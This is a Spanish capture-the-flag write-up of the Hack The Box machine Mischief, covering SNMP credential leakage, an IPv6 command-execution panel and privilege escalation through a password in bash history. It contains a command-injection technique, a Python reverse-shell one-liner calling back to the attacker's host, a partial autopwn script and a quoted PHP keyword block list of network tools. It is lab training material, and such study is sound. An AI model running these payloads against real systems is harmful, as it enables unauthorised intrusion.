---
title: "HTB: Resolución de Mischief"
date: 2022-10-14 19:00:00 +/-TTTT
categories: [HTB, Linux]
tags: [insane,snmp,ipv6,iptables, icmp exfiltration]     ## TAG names should always be lowercase
image: /photos/2022-10-14-Mischief-WriteUp/htb.jpg
---

**Mischief** es una máquina ***Linux*** en la que la fase de **reconocimiento** va a ser clave. Gracias a unas credenciales que localizaremos enumerando el servicio ***snmp*** (161/UDP), podremos acceder a un servidor web que corre en el puerto 3366. Aquí encontraremos una **contraseña** que nos servirá para autenticarnos a otro portal web que corre por el **puerto 80** y **solo** está **visible por ipv6**. Una vez autenticados, la web nos permitirá **ejecutar comandos** en la máquina víctima, pudiéndonos enviar una ***reverse shell por ipv6***, ganando acceso como ***www-data***. Posteriormente pivotaremos al usuario ***loki*** consiguiendo una contraseña que se encuentra en un archivo del sistema. Finalmente podremos leer el historial de *bash* de *loki* y encontraremos allí la contraseña del usuario ***root***.

En el **anexo** explicaré una forma de poder **visualizar archivos** de la máquina víctima utilizando únicamente ***pings***. También inspeccionaremos las **reglas** configuradas por ***iptables*** y mostraré un **script** para ganar acceso de manera **automática** a la máquina víctima como ***www-data***.


##  Información de la máquina 

<table width="100%" cellpadding="2">
    <tr>
        <td>
            <img src="/photos/2022-10-14-Mischief-WriteUp/mischief.png" alt="drawing" width="465" />  
        </td>
        <td>
            <img src="/photos/2022-10-14-Mischief-WriteUp/graph.png" alt="drawing" width="400"/>  
        </td>
    </tr>
</table>

##  Reconocimiento 

###  ping


Primero enviaremos un ***ping*** a la máquina víctima para saber su **sistema operativo** y si tenemos **conexión** con ella. Un ***TTL*** menor o igual a 64 significa que la máquina es *Linux*. Por otra parte, un *TTL* menor o igual a 128 significa que la máquina es *Windows*.

<img src="/photos/2022-10-14-Mischief-WriteUp/ping.png"  />  

Vemos que nos enfrentamos a una máquina ***Linux*** ya que su ttl es 63.
 
###  nmap

Ahora procedemos a escanear **todo el rango de puertos** de la máquina víctima con la finalidad de encontrar aquellos que estén **abiertos** (*status open*). Lo haremos con la herramienta ```nmap```. 

<img src="/photos/2022-10-14-Mischief-WriteUp/allports.png" />  

**-sS** efectúa un *TCP SYN Scan*, iniciando rápidamente una conexión sin finalizarla.  
**-min-rate 5000** sirve para enviar paquetes no mas lentos que 5000 paquetes por segundo.  
**-n** sirve para evitar resolución DNS.  
**-Pn** para evitar host discovery.  
**-vvv** triple *verbose* para que nos vuelque la información que vaya encontrando el escaneo.  
**-p-** para escanear todo el rango de puertos.  
**--open** para escanear solo aquellos puertos que tengan un *status open*.  
**-oG** exportará la evidencia en formato *grepeable* al fichero **allPorts** en este caso.

Una vez descubiertos los **puertos abiertos**, que en este caso son el **22 y el 3366**, lanzaremos una serie de *scripts* básicos de enumeración contra estos, en busca de los **servicios** que están corriendo y de sus **versiones**. 

Ejecutaremos: ```nmap -sCV -p22,80 10.10.11.170 -oN targeted```. Obtendremos el siguiente volcado:

<img src="/photos/2022-10-14-Mischief-WriteUp/targeted.png" />  

El puerto **22** es **SSH** y el puerto **3366** parece que es **HTTP**. De momento, como no disponemos de credenciales para autenticarnos contra *SSH*, nos centraremos en auditar el servicio web que corre en el puerto 3366.

###  Puerto 3366 abierto (HTTP)

Los *scripts* básicos de reconocimiento de *nmap* nos han descubierto que nos estamos enfrentando a un servicio web montado con ***python***, concretamente ***python2.7.15***. Al ser python2, es posible que la web se haya desplegado con la herramienta ***SimpleHTTPServer*** (*python2 -m SimpleHTTPServer 3366*). Además, también parece que se requiere de autenticación para poder acceder al portal web.  

Podemos utilizar la herramienta ***curl*** para ver las cabeceras de respuesta de la web:

<img src="/photos/2022-10-14-Mischief-WriteUp/curl.png" />  

Estamos recibiendo un ***401 Unauthorized*** en vez de un *200 Ok*.

Si accedemos a la web:

<img src="/photos/2022-10-14-Mischief-WriteUp/password3366.png"  />  

Vemos que efectivamente se necesitan credenciales válidas. Podemos probar con credenciales por defecto como *admin/admin*, *guest/guest* o *admin/admin123*, pero no conseguiremos acceder. En este punto, viendo que no podemos ni penetrar el puerto 3366 ni el 22, es una buena opción escanear los **puertos** de la máquina víctima por ***UDP***. 

###  Escaneo de puertos por UDP

En el descubrimiento de puertos del principio, estábamos escaneando solo por TCP. Para escanear los puertos por UDP deberemos de utilizar el parámetro ***-sU***. Los escaneos por ***UDP*** suelen ser bastante mas **lentos** que los que van por TCP. Por lo tanto, solo escanearemos los **500 puertos mas comunes** con el parámetro **-top-ports 500**.

<img src="/photos/2022-10-14-Mischief-WriteUp/allportsUDP.png"  />  

*Nmap* nos acaba de descubrir que el puerto ***161/UDP (snmp)*** se encuentra **abierto**. 

###  Puerto 161/UDP abierto (snmp)

***SNMP*** (*Simple Network Management Protocol*) es un protocolo utilizado para monitorear diferentes dispositivos en la red (como routers, switches, impresoras, IoT...).

Igual que con los puertos 22 y 3366, podemos lanzar una serie de **scripts básicos de reconocimiento contra el 161** con nmap. El comando será: ```nmap -sCVU -p161 10.10.10.92 -oN targetedUDP```. Obtenemos el siguiente volcado:


```python

## Nmap 7.92 scan initiated Fri Oct 14 23:46:46 2022 as: nmap -sCVU -p161 -oN targetedUDP 10.10.10.92
Nmap scan report for 10.10.10.92
Host is up (0.028s latency).

PORT    STATE SERVICE VERSION
161/udp open  snmp    SNMPv1 server; net-snmp SNMPv3 server (public)
| snmp-interfaces: 
|   lo
|     IP address: 127.0.0.1  Netmask: 255.0.0.0
|     Type: softwareLoopback  Speed: 10 Mbps
|     Traffic stats: 0.00 Kb sent, 0.00 Kb received
|   Intel Corporation 82545EM Gigabit Ethernet Controller (Copper)
|     IP address: 10.10.10.92  Netmask: 255.255.255.0
|     MAC address: 00:50:56:b9:5f:e1 (VMware)
|     Type: ethernetCsmacd  Speed: 1 Gbps
|_    Traffic stats: 10.33 Kb sent, 88.70 Kb received
| snmp-processes: 
|   1: 
|     Name: systemd
|     Path: /sbin/init
|     Params: maybe-ubiquity
|   2: 
|     Name: kthreadd
|   3: 
|     Name: kworker/0:0
|   4: 
|     Name: kworker/0:0H
|   5: 
|     Name: kworker/u2:0
|   6: 
|     Name: mm_percpu_wq
|   7: 
|     Name: ksoftirqd/0
|   8: 
|     Name: rcu_sched
|   9: 
|     Name: rcu_bh
|   10: 
|     Name: migration/0
|   11: 
|     Name: watchdog/0
|   12: 
|     Name: cpuhp/0
|   13: 
|     Name: kdevtmpfs
|   14: 
|     Name: netns
|   15: 
|     Name: rcu_tasks_kthre
|   16: 
|     Name: kauditd
|   17: 
|     Name: khungtaskd
|   18: 
|     Name: oom_reaper
|   19: 
|     Name: writeback
|   20: 
|     Name: kcompactd0
|   21: 
|     Name: ksmd
|   22: 
|     Name: khugepaged
|   23: 
|     Name: crypto
|   24: 
|     Name: kintegrityd
|   25: 
|     Name: kblockd
|   26: 
|     Name: ata_sff
|   27: 
|     Name: md
|   28: 
|     Name: edac-poller
|   29: 
|     Name: devfreq_wq
|   30: 
|     Name: watchdogd
|   31: 
|     Name: kworker/u2:1
|   32: 
|     Name: kworker/0:1
|   34: 
|     Name: kswapd0
|   35: 
|     Name: ecryptfs-kthrea
|   77: 
|     Name: kthrotld
|   78: 
|     Name: acpi_thermal_pm
|   79: 
|     Name: scsi_eh_0
|   80: 
|     Name: scsi_tmf_0
|   81: 
|     Name: scsi_eh_1
|   82: 
|     Name: scsi_tmf_1
|   83: 
|     Name: kworker/u2:2
|   84: 
|     Name: kworker/u2:3
|   88: 
|     Name: ipv6_addrconf
|   89: 
|     Name: kworker/0:2
|   98: 
|     Name: kstrp
|   115: 
|     Name: charger_manager
|   116: 
|     Name: kworker/u2:4
|   179: 
|     Name: mpt_poll_0
|   180: 
|     Name: mpt/0
|   218: 
|     Name: scsi_eh_2
|   219: 
|     Name: scsi_tmf_2
|   220: 
|     Name: scsi_eh_3
|   221: 
|     Name: scsi_tmf_3
|   222: 
|     Name: scsi_eh_4
|   223: 
|     Name: scsi_tmf_4
|   224: 
|     Name: scsi_eh_5
|   225: 
|     Name: scsi_tmf_5
|   226: 
|     Name: scsi_eh_6
|   227: 
|     Name: scsi_tmf_6
|   228: 
|     Name: scsi_eh_7
|   229: 
|     Name: scsi_tmf_7
|   230: 
|     Name: scsi_eh_8
|   231: 
|     Name: scsi_tmf_8
|   232: 
|     Name: scsi_eh_9
|   233: 
|     Name: scsi_tmf_9
|   234: 
|     Name: scsi_eh_10
|   235: 
|     Name: scsi_tmf_10
|   236: 
|     Name: scsi_eh_11
|   237: 
|     Name: scsi_tmf_11
|   238: 
|     Name: scsi_eh_12
|   239: 
|     Name: scsi_tmf_12
|   240: 
|     Name: scsi_eh_13
|   241: 
|     Name: scsi_tmf_13
|   242: 
|     Name: scsi_eh_14
|   243: 
|     Name: scsi_tmf_14
|   244: 
|     Name: scsi_eh_15
|   245: 
|     Name: scsi_tmf_15
|   246: 
|     Name: scsi_eh_16
|   247: 
|     Name: scsi_tmf_16
|   248: 
|     Name: scsi_eh_17
|   249: 
|     Name: scsi_tmf_17
|   250: 
|     Name: scsi_eh_18
|   251: 
|     Name: scsi_tmf_18
|   252: 
|     Name: scsi_eh_19
|   253: 
|     Name: scsi_tmf_19
|   254: 
|     Name: scsi_eh_20
|   255: 
|     Name: scsi_tmf_20
|   256: 
|     Name: scsi_eh_21
|   257: 
|     Name: scsi_tmf_21
|   258: 
|     Name: scsi_eh_22
|   259: 
|     Name: scsi_tmf_22
|   260: 
|     Name: scsi_eh_23
|   261: 
|     Name: scsi_tmf_23
|   262: 
|     Name: scsi_eh_24
|   263: 
|     Name: scsi_tmf_24
|   264: 
|     Name: scsi_eh_25
|   265: 
|     Name: scsi_tmf_25
|   266: 
|     Name: scsi_eh_26
|   267: 
|     Name: scsi_eh_27
|   268: 
|     Name: scsi_tmf_27
|   269: 
|     Name: scsi_tmf_26
|   270: 
|     Name: scsi_eh_28
|   271: 
|     Name: scsi_tmf_28
|   272: 
|     Name: scsi_eh_29
|   273: 
|     Name: scsi_tmf_29
|   274: 
|     Name: scsi_eh_30
|   275: 
|     Name: scsi_tmf_30
|   276: 
|     Name: scsi_eh_31
|   277: 
|     Name: scsi_tmf_31
|   278: 
|     Name: scsi_eh_32
|   279: 
|     Name: scsi_tmf_32
|   280: 
|     Name: kworker/u2:5
|   281: 
|     Name: kworker/u2:6
|   282: 
|     Name: kworker/u2:7
|   283: 
|     Name: kworker/u2:8
|   284: 
|     Name: kworker/u2:9
|   285: 
|     Name: kworker/u2:10
|   286: 
|     Name: kworker/u2:11
|   287: 
|     Name: kworker/u2:12
|   288: 
|     Name: kworker/u2:13
|   289: 
|     Name: kworker/u2:14
|   290: 
|     Name: kworker/u2:15
|   291: 
|     Name: kworker/u2:16
|   292: 
|     Name: kworker/u2:17
|   293: 
|     Name: kworker/u2:18
|   294: 
|     Name: kworker/u2:19
|   295: 
|     Name: kworker/u2:20
|   296: 
|     Name: kworker/u2:21
|   297: 
|     Name: kworker/u2:22
|   298: 
|     Name: kworker/u2:23
|   299: 
|     Name: kworker/u2:24
|   300: 
|     Name: kworker/u2:25
|   301: 
|     Name: kworker/u2:26
|   302: 
|     Name: kworker/u2:27
|   303: 
|     Name: kworker/u2:28
|   304: 
|     Name: kworker/u2:29
|   305: 
|     Name: kworker/u2:30
|   306: 
|     Name: kworker/u2:31
|   307: 
|     Name: kworker/u2:32
|   308: 
|     Name: ttm_swap
|   309: 
|     Name: irq/16-vmwgfx
|   311: 
|     Name: kworker/0:1H
|   375: 
|     Name: raid5wq
|   425: 
|     Name: jbd2/sda2-8
|   426: 
|     Name: ext4-rsv-conver
|   465: 
|     Name: vmtoolsd
|     Path: /usr/bin/vmtoolsd
|   478: 
|     Name: systemd-journal
|     Path: /lib/systemd/systemd-journald
|   479: 
|     Name: lvmetad
|     Path: /sbin/lvmetad
|     Params: -f
|   482: 
|     Name: iscsi_eh
|   492: 
|     Name: ib-comp-wq
|   493: 
|     Name: ib_mcast
|   495: 
|     Name: ib_nl_sa_wq
|   496: 
|     Name: systemd-udevd
|     Path: /lib/systemd/systemd-udevd
|   499: 
|     Name: rdma_cm
|   612: 
|     Name: systemd-timesyn
|     Path: /lib/systemd/systemd-timesyncd
|   615: 
|     Name: systemd-network
|     Path: /lib/systemd/systemd-networkd
|   655: 
|     Name: systemd-resolve
|     Path: /lib/systemd/systemd-resolved
|   671: 
|     Name: networkd-dispat
|     Path: /usr/bin/python3
|     Params: /usr/bin/networkd-dispatcher
|   675: 
|     Name: atd
|     Path: /usr/sbin/atd
|     Params: -f
|   676: 
|     Name: lxcfs
|     Path: /usr/bin/lxcfs
|     Params: /var/lib/lxcfs/
|   678: 
|     Name: VGAuthService
|     Path: /usr/bin/VGAuthService
|   679: 
|     Name: systemd-logind
|     Path: /lib/systemd/systemd-logind
|   681: 
|     Name: rsyslogd
|     Path: /usr/sbin/rsyslogd
|     Params: -n
|   684: 
|     Name: cron
|     Path: /usr/sbin/cron
|     Params: -f
|   685: 
|     Name: dbus-daemon
|     Path: /usr/bin/dbus-daemon
|     Params: --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
|   705: 
|     Name: cron
|     Path: /usr/sbin/CRON
|     Params: -f
|   708: 
|     Name: accounts-daemon
|     Path: /usr/lib/accountsservice/accounts-daemon
|   711: 
|     Name: snmpd
|     Path: /usr/sbin/snmpd
|     Params: -Lsd -Lf /dev/null -u Debian-snmp -g Debian-snmp -I -smux mteTrigger mteTriggerConf -f
|   715: 
|     Name: sh
|     Path: /bin/sh
|     Params: -c /home/loki/hosted/webstart.sh
|   751: 
|     Name: sh
|     Path: /bin/sh
|     Params: /home/loki/hosted/webstart.sh
|   762: 
|     Name: python
|     Path: python
|     Params: -m SimpleHTTPAuthServer 3366 loki:godofmischiefisloki --dir /home/loki/hosted/
|   763: 
|     Name: polkitd
|     Path: /usr/lib/policykit-1/polkitd
|     Params: --no-debug
|   838: 
|     Name: iscsid
|     Path: /sbin/iscsid
|   841: 
|     Name: iscsid
|     Path: /sbin/iscsid
|   865: 
|     Name: mysqld
|     Path: /usr/sbin/mysqld
|     Params: --daemonize --pid-file=/run/mysqld/mysqld.pid
|   875: 
|     Name: sshd
|     Path: /usr/sbin/sshd
|     Params: -D
|   919: 
|     Name: agetty
|     Path: /sbin/agetty
|     Params: -o -p -- \u --noclear tty1 linux
|   1002: 
|     Name: apache2
|     Path: /usr/sbin/apache2
|     Params: -k start
|   1013: 
|     Name: apache2
|     Path: /usr/sbin/apache2
|     Params: -k start
|   1014: 
|     Name: apache2
|     Path: /usr/sbin/apache2
|     Params: -k start
|   1015: 
|     Name: apache2
|     Path: /usr/sbin/apache2
|     Params: -k start
|   1016: 
|     Name: apache2
|     Path: /usr/sbin/apache2
|     Params: -k start
|   1017: 
|     Name: apache2
|     Path: /usr/sbin/apache2
|_    Params: -k start
|_snmp-win32-software: ERROR: Script execution failed (use -d to debug)
| snmp-info: 
|   enterprise: net-snmp
|   engineIDFormat: unknown
|   engineIDData: b6a9f84e18fef95a00000000
|   snmpEngineBoots: 20
|_  snmpEngineTime: 3m16s
| snmp-sysdescr: Linux Mischief 4.15.0-20-generic #21-Ubuntu SMP Tue Apr 24 06:16:15 UTC 2018 x86_64
|_  System uptime: 3m15.91s (19591 timeticks)
| snmp-netstat: 
|   TCP  0.0.0.0:22           0.0.0.0:0
|   TCP  0.0.0.0:3366         0.0.0.0:0
|   TCP  10.10.10.92:3366     10.10.14.2:33672
|   TCP  127.0.0.1:3306       0.0.0.0:0
|   TCP  127.0.0.53:53        0.0.0.0:0
|   UDP  0.0.0.0:161          *:*
|   UDP  0.0.0.0:48905        *:*
|_  UDP  127.0.0.53:53        *:*
Service Info: Host: Mischief

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
## Nmap done at Fri Oct 14 23:48:12 2022 -- 1 IP address (1 host up) scanned in 86.03 seconds
```

Nmap ha lanzado un script llamado **snmp-processes**, que nos lista los **procesos** que están **corriendo** en la máquina. Si se está utilizando SimpleHTTPServer en el puerto 3366 de la máquina víctima y además se requiere autenticación para acceder, es posible que el comando que ha utilizado el usuario para desplegar la web sea del tipo: ```python2 -m SimpleHTTPAuthServer <username>:<password>```. Podemos buscar este proceso en el volcado que nos acaba de reportar *nmap*.  

Efectivamente, en el proceso **762** vemos lo siguiente:

```ruby
762: 
|     Name: python
|     Path: python
|     Params: -m SimpleHTTPAuthServer 3366 loki:godofmischiefisloki --dir /home/loki/hosted/
```

Las **credenciales** que se han utilizado para poder acceder al servicio web del puerto 3366 son ```loki:godofmischiefisloki```.

Además, ***SNMP*** también nos permite visualizar la ***ipv6*** de la máquina víctima. Recordemos que no es lo mismo escanear puertos por ipv4 que por ipv6. A lo mejor la máquina tiene implementadas reglas ***iptables*** que no permiten escanear puertos por ipv4 y viceversa (En el Anexo se pueden ver las reglas implementadas). La podemos obtener con el comando ```snmpbulkwalk -c public -v2c 10.10.10.92 ipAddressType```:

<img src="/photos/2022-10-14-Mischief-WriteUp/ipAddressType.png"  />  

De todas las que nos salen, la que utilizaremos será la que empieza por dead:beef. Si le damos **formato ipv6** obtenemos: ***dead:beef::250:56ff:feb9:5fe1***.

En caso de quedarnos bloquados, utilizaremos esta ip para escanear puertos.

### Autenticación en el puerto 3366 (HTTP)

Ahora ya podemos acceder a la página web con las **credenciales anteriores**. Una vez dentro, vemos lo siguiente:

<img src="/photos/2022-10-14-Mischief-WriteUp/indexhtml3366.png"  />  

Aparte de las que ya tenemos, vemos otro usurio y contraseña: ```administrator:trickeryanddeceit```. **No hay nada mas interesante**. Podríamos inspeccionar la imagen para ver si se ha guardado información relevante en los bytes menos significativos de la misma o *fuzzear* por directorios que se encuentren en la ruta *http://10.10.10.92:3366/*, pero no encontraremos nada. Recordemos que podemos escanear **puertos** por **ipv6**, ya que disponemos de la ipv6 de la víctima. 

### Escaneo de puertos por ipv6

El escaneo de puertos es el mismo que por ipv4 pero deeremos utilizar el parametro ***-6***, que indica que estamos utilizando ***ipv6***. 

<img src="/photos/2022-10-14-Mischief-WriteUp/allportsIPV6.png"  />  

Nmap nos decubre que por ipv6 está **abierto** un puerto que por ipv4 no estaba, el ***80 (HTTP)***. Vamos a inspeccionarlo.

### Puerto 80 abierto por ipv6 (HTTP) 

La forma para acceder a la web es: ***http://\[dead:beef::250:56ff:feb9:5fe1\]***. Lo primero que vemos al acceder a la web es lo siguiente:

<img src="/photos/2022-10-14-Mischief-WriteUp/indexhtmlipv6.png"  />  

Tenemos acceso a un **portal de *login***:

<img src="/photos/2022-10-14-Mischief-WriteUp/loginpanel.png"  />  

En este punto, podemos probar con las credenciales que tenemos y que vimos en la página web del puerto 3366: *loki:godofmischiefisloki* y *loki:trickeryanddeceit*. No conseguiremos acceder. También podemos probar con estas contraseñas pero con usuarios diferentes, como admin, administrator, guest, user... Después de varios intentos nos conseguiremos **autenticar** como el usuario ***administrator*** y contraseña ***trickeryanddeceit***.  

Una vez dentro, tendremos acceso a una especie de consola donde parece que podremos **ejecutar comandos**:

<img src="/photos/2022-10-14-Mischief-WriteUp/commandpanel.png"  />  

También nos dan una pista diciéndonos que en el ***homedir*** de un usuario, se encuentra un archivo ***credentials*** con la contraseña de este usuario. Es posible que sea ***loki***.

##  Consiguiendo shell como www-data
### Explotando Command Execution Panel


Lo primero que voy a hacer es intentar enviarme un **ping**. Si me pongo en escucha de trazas icmp por la interfaz tun0 recibo dos trazas:

<img src="/photos/2022-10-14-Mischief-WriteUp/pingreceived.png"  />  

Esto quiere decir que **tenemos conexión** con la máquina.  

Lo siguiente que intento hacer es ejecutar comandos como *ls* o *cat /home/loki/credentials* pero parece que los **bloquea**. Otros como por ejemplo id los ejecuta pero no muestra el output. Ahora bien, probando con inyecciones del tipo ***ping -c 2 127.0.0.1;id*** consigo que se me muestre el output de ***id***:

<img src="/photos/2022-10-14-Mischief-WriteUp/id.png"  />  

Para manejarnos mejor y tener acceso a todos los comandos y directorios de la máquina víctima, vamos a enviarnos una reverse shell. **Lo haremos por ipv6**, ya hay reglas iptables configurardas y no será posible por ipv4 (ver Anexo).

Por lo tanto, el ***payload*** que utilizaré será:

```bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("dead:beef:2::1000",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```

En mi caso, mi ipv6 es **dead:beef:2::1000** y quiero recibir la shell por el puerto **443**.

Ahora, si me pongo en escucha por esta interfaz con el comando *ncat -nv6 --listen dead:beef:2::1000 443* y ejecuto la instrucción anterior, debería de obtener una shell:

<img src="/photos/2022-10-14-Mischief-WriteUp/consolereceived.png"  />  

En el primer apartado del ***Anexo*** dejo un *script* en python que te automatiza la intrusión como el usuario www-data.

En el **Anexo** explico una forma de poder visualizar el archivo ***credentials*** sin ganar acceso a la máquina, con ***pings***.

##  Consiguiendo shell como loki

Una vez recibida la shell, deberemos hacerle un **tratamiento** para que nos permita poder hacer *Ctrl+C*, limpiar la terminal, movernos con las flechas... Los  comandos que ingresaremos serán:

```python
script /dev/null -c bash
*Ctrl+Z*
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=bash
```

También deberemos **adaptar el número de filas y de columnas** de esta *shell*. Con el comando ```stty size``` podemos consultar nuestras filas y columnas y con el comando ```stty rows <rows> cols <cols>``` podemos ajustar estos campos.

###  Reconocimiento del sistema

#### Analizando archivos de la web

En la ruta */var/www/html* podemos encontrar los archivos que componen la web del puerto 80. Si inspeccionamos el ***index.php*** podemos ver por qué no nos dejaba ejecutar algunos comandos como *ls*, *curl* o *wget*.

```php
www-data@Mischief:/var/www/html$ cat index.php 
<?php

session_start();

require 'database.php';

if( isset($_SESSION['user_id']) ){

	$records = $conn->prepare('SELECT id,user,password FROM users WHERE id = :id');
	$records->bindParam(':id', $_SESSION['user_id']);
	$records->execute();
	$results = $records->fetch(PDO::FETCH_ASSOC);

	$user = NULL;

	if( count($results) > 0){
		$user = $results;
	}

}

?>

<!DOCTYPE html>
<html>
<title>Command Execution Panel (Beta)</title>
<head>
	<link rel="stylesheet" type="text/css" href="assets/css/style.css">
	<link href="http://fonts.googleapis.com/css?family=Comfortaa" rel="stylesheet" type="text/css">
</head>
<body>

	<div class="header">
		<a href="/">Command Execution Panel</a>
	</div>

	<?php if( !empty($user) ): ?>

		<br />Welcome <?= $user['user']; ?> 
		<br /><br />
		<a href="logout.php">Logout?</a>
		<form action="/" method="post">
		Command: <br>
		<input type="text" name="command" value="ping -c 2 127.0.0.1"><br>
		<input type="submit" value="Execute">
		</form>
		<p>
		<p>
		<p>In my home directory, i have my password in a file called credentials, Mr Admin
		<p>
	<?php else: ?>

		<h1>Please Login
		<a href="login.php">Login</a>
	<?php endif; ?>

</body>
</html>
<?php
if(isset($_POST['command'])) {
	$cmd = $_POST['command'];
	if (strpos($cmd, "nc" ) !== false){
		echo "Command is not allowed.";
	} elseif (strpos($cmd, "bash" ) !== false){
		echo "Command is not allowed.";
	} elseif (strpos($cmd, "chown" ) !== false){
		echo "Command is not allowed.";
	} elseif (strpos($cmd, "setfacl" ) !== false){
		echo "Command is not allowed.";
	} elseif (strpos($cmd, "chmod" ) !== false){
		echo "Command is not allowed.";
	} elseif (strpos($cmd, "perl" ) !== false){
		echo "Command is not allowed.";
	} elseif (strpos($cmd, "find" ) !== false){
		echo "Command is not allowed.";
	} elseif (strpos($cmd, "locate" ) !== false){
		echo "Command is not allowed.";
	} elseif (strpos($cmd, "ls" ) !== false){
		echo "Command is not allowed.";
	} elseif (strpos($cmd, "php" ) !== false){
		echo "Command is not allowed.";
	} elseif (strpos($cmd, "wget" ) !== false){
		echo "Command is not allowed.";
	} elseif (strpos($cmd, "curl" ) !== false){
		echo "Command is not allowed.";
	} elseif (strpos($cmd, "dir" ) !== false){
		echo "Command is not allowed.";
	} elseif (strpos($cmd, "ftp" ) !== false){
		echo "Command is not allowed.";
	} elseif (strpos($cmd, "telnet" ) !== false){
		echo "Command is not allowed.";
	} else {
		system("$cmd > /dev/null 2>&1");
		echo "Command was executed succesfully!";
	}
}
?>
```
En el archivo ***database.php*** podemos encontrar las **credenciales** para acceder a la **base de datos**: 

```php
www-data@Mischief:/var/www/html$ cat database.php  
<?php
$server = 'localhost';
$username = 'debian-sys-maint';
$password = 'nE1S9Aw1L0Ky3Y9h';
$database = 'dbpanel';

try{
	$conn = new PDO("mysql:host=$server;dbname=$database;", $username, $password);
} catch(PDOException $e){
	die( "Connection failed: " . $e->getMessage());
}
```

Son: ```debian-sys-maint:nE1S9Aw1L0Ky3Y9h```

Podríamos intentar acceder a la base de datos pero lo único que encontraremos será la contraseña del usuario *administrator* hasheada, y ya la sabemos. 

#### Analizando archivo credentials

Recordemos que nos habían dado una pista de que existía un archivo ***credentials*** en el homedir de un usuario, posiblemente ***loki***.

```ruby
www-data@Mischief:/home/loki$ cat credentials 
pass: lokiisthebestnorsegod
```

Encontramos una contraseña: ```lokiisthebestnorsegod```. Ahora podemos intentar autenticarnos como loki en la màquina víctima haciendo **su loki** o por SSH, que recordemos que está expuesto. Si nos conectamos por SSH con las credenciales ```loki:lokiisthebestnorsegod```:

<img src="/photos/2022-10-14-Mischief-WriteUp/lokissh.png"  />  

Ahora vamos a analizar el sistema como este usuario para ver si como ***loki*** podemos escalar a ***root***.

##  Consiguiendo shell como root

###  Reconocimiento del sistema 

#### User flag

Podemos encontrar la primera flag **user.txt** en el *homedir* de *loki*:

```ruby
loki@Mischief:~$ cat user.txt 
bf58078e7b802c5f32b545eea7c90060
```

#### Analizando .bash_history del usurio loki

Si listamos los archivos del ***homedir*** de loki nos encontramos con que podemos **leer** el **historial de bash** de este usuario. Normalmente el ***.bash_history*** apunta al */dev/null* y no se puede visualizar, pero en este caso si que lo podremos hacer:

```ruby
loki@Mischief:~$ ls -la
total 52
drwxr-xr-x 6 loki loki 4096 Jul 25 13:29 .
drwxr-xr-x 3 root root 4096 Jul 20 15:16 ..
-rw------- 1 loki loki  192 Jul 25 13:29 .bash_history
-rw-r--r-- 1 loki loki  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 loki loki 3771 Apr  4  2018 .bashrc
drwx------ 2 loki loki 4096 Jul 20 15:16 .cache
drwx------ 3 loki loki 4096 Jul 20 15:16 .gnupg
drwxrwxr-x 4 loki loki 4096 Jul 20 15:16 .local
-rw-r--r-- 1 loki loki  807 Apr  4  2018 .profile
-rw-rw-r-- 1 loki loki   66 May 14  2018 .selected_editor
-rw-r--r-- 1 loki loki    0 May 14  2018 .sudo_as_admin_successful
-rw-rw-r-- 1 loki loki   28 May 17  2018 credentials
drwxrwxr-x 2 loki loki 4096 Jul 20 15:16 hosted
-r-------- 1 loki loki   33 May 17  2018 user.txt
```

Si lo **abrimos**:

```
python -m SimpleHTTPAuthServer loki:lokipasswordmischieftrickery
exit
free -mt
ifconfig
cd /etc/
sudo su
su
exit
su root
ls -la
sudo -l
ifconfig
id
cat .bash_history 
nano .bash_history 
exit
```

Nos encontraremos con otra contraseña: ```loki:lokipasswordmischieftrickery```.

Podríamos comprobar si es la contraseña de **root**, con ***su root***. Nos pone **permiso denegado**:

```ruby
loki@Mischief:~$ su root    
-bash: /bin/su: Permission denied
```

Si listamos los **permisos** del binario **su**:

```ruby
loki@Mischief:~$ ls -la /bin/su
-rwsr-xr-x+ 1 root root 44664 Jan 25  2018 /bin/su
```

Vemos que sí que deberíamos de poder ejecutarlo ya que ***otros*** tienen permisos de ejecución. Pero el **+** también indica que se han configurado **permisos avanzados** para este binario. Con el comando ***getfacl*** podemos inspeccionarlos:

```ruby
loki@Mischief:~$ getfacl /bin/su
getfacl: Removing leading '/' from absolute path names
## file: bin/su
## owner: root
## group: root
## flags: s--
user::rwx
user:loki:r--
group::r-x
mask::r-x
other::r-x
```

Se ha configurado una **regla avanzada** para que el usuario ***loki*** solo tenga permisos de **lectura** para este binario. Por lo tanto como este usuario no podremos saltar a root. Pero recordemos que también hemos ganado acceso a la máquina como ***www-data*** y este usuario si que deberia de tener permisos para ejecutar el comando ***su***.

Por tanto, si **migramos** otra vez al usuario ***www-data*** (lo podemos hacer enviándonos otra vez una reverse shell) y probamos a autenticarnos como ***root*** con la contraseña ```lokipasswordmischieftrickery```:

```ruby
www-data@Mischief:/home/loki$ su root
Password: 
root@Mischief:/home/loki## whoami
root
```

Nos convertiremos en ***root*** y ya podremos visualizar la flag ***root.txt*** (esta vez la flag no se encuentra en el *homedir* de *root*, la econtraremos en la ruta */usr/lib/gcc/x86_64-linux-gnu/7/root.txt*):

```ruby
root@Mischief:~## cat root.txt 
The flag is not here, get a shell to find it!
root@Mischief:~## find / -name root.txt 2>/dev/null
/usr/lib/gcc/x86_64-linux-gnu/7/root.txt
/root/root.txt
root@Mischief:~## cat /usr/lib/gcc/x86_64-linux-gnu/7/root.txt
ae155fad479c56f912c65d7be4487807
```

##  Anexo

###  Autopwn www-data

El siguiente ***script*** automatiza la intrusión a la máquina como el usuario ***www-data***. Simplemente se debe **cambiar** la ipv6 dead:beef:2::1000 a la ipv6 de tu interfaz tun0 de *HTB*.

```python
#!/usr/bin/python3

from pwn import *
import sys,signal,os,requests

## Ctrl + C
def def_handler(sig, frame):
    print("[!] Saliendo...")
    sys.exit(1)
    
signal.signal(signal.SIGINT,def_handler)

#Variables globales 
address = ''
burp = {'http': 'http://localhost:8080'}

def makeRequest():
    url = f"http://[{address}]/"
    
    post_data = {
            'command':'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("dead:beef:2::1000",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\''
            }

    requests.post(url,data=post_data, proxies = burp)
    

